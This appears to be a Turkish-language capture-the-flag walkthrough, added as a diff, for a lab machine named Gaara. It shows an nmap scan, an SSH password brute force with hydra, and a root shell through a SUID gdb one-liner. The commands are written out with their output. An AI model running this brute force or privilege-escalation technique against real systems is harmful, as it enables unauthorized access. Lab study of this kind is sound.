@@ -1,0 +1,83 @@
+    ####enumeration
+
+Nmap
+nmapBir tarama ile başlayacağız .
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap $targetip  
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 08:40 EDT
+Nmap scan report for $targetip
+Host is up (0.032s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Çalışacak iki hizmetimiz var: Her ikisi de standart bağlantı noktalarında SSH ve HTTP.
+
+Web Numaralandırma (GOBUSTER İLE SAYFALARIN İÇİNDEN BASE58 gaara:mynameis şifresi bulunuyor.)
+
+80 numaralı bağlantı noktasındaki web sitesini ziyaret ettiğimizde (http://$target.ip/), adlı bir anime karakterinin tam ekran görüntüsü ile karşılaşıyoruz Gaara. Sayfanın başlığı da bu ismi paylaşıyor.
+┌──(kali㉿kali)-[~]
+└─$ curl http://$targetip/           
+<html>
+    <title>Gaara</title>
+        <img src="gaara.jpg" alt="wallpaper" width="100%" height="100%">
+</html>
+Web sitesinin gizli dizinlerini kaba zorlamak herhangi bir sonuç vermiyor.
+
+    ####exploitation
+
+Web sitesi bize herhangi bir ipucu ve yönlendirme vermediği için geriye sadece SSH hizmeti kalıyor. Web sitesinden toplanan bilgilerin azlığı nedeniyle, olası bir SSH kullanıcı adı hakkında yapabileceğimiz tek mantıklı tahmin gaara.
+Bunu kullanarak hydra brute force yapalım. Bu çevrimiçi bir saldırı olduğundan, /usr/share/wordlists/metasploit/unix_passwords.txt gibi daha küçük bir parola listesiyle başlayacağız.
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -l gaara -P /usr/share/wordlists/metasploit/unix_passwords.txt $targetip ssh
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-27 08:56:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
+[DATA] attacking ssh://$targetip/
+[STATUS] 147.00 tries/min, 147 tries in 00:01h, 865 to do in 00:06h, 16 active
+[22][ssh] host: $targetip   login: gaara   password: $censoredpassword
+1 of 1 target successfully completed, 1 valid password found
+...
+Bir süre sonra şifreyi buluyoruz $censoredpassword. Neyse ki, kaba kuvvet saldırısı işe yaradı ve artık hedefe ssh bağlantısı sağlayabiliyoruz gaara:$censoredpassword.
+
+┌──(kali㉿kali)-[~]
+└─$ ssh gaara@$targetip
+gaara@$targetip's password: 
+...
+gaara@Gaara:~$ id
+uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
+
+      ####privilege escalation
+
+SUID Suistimali
+Sistemdeki hangi ikili dosyaların SUID bitinin ayarlanmış olduğunu kontrol ederek yerel numaralandırmaya başlayacağız.
+gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gdb
+/usr/bin/sudo
+/usr/bin/gimp-2.10
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/umount
+Sonuçlar arasında /usr/bin/gdb ikili dosyasını görüyoruz. Bu ikili dosyada SUID izinlerinin nasıl kötüye kullanılacağına dair hızlı bir arama bizi bu GTFOBins makalesine götürür. SUID bölümünü okuduktan sonra aşağıdaki gibi bir root shell üretebilmeliyiz.
+
+gaara@Gaara:~$ whoami
+gaara
+gaara@Gaara:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+...
+# whoami
+root
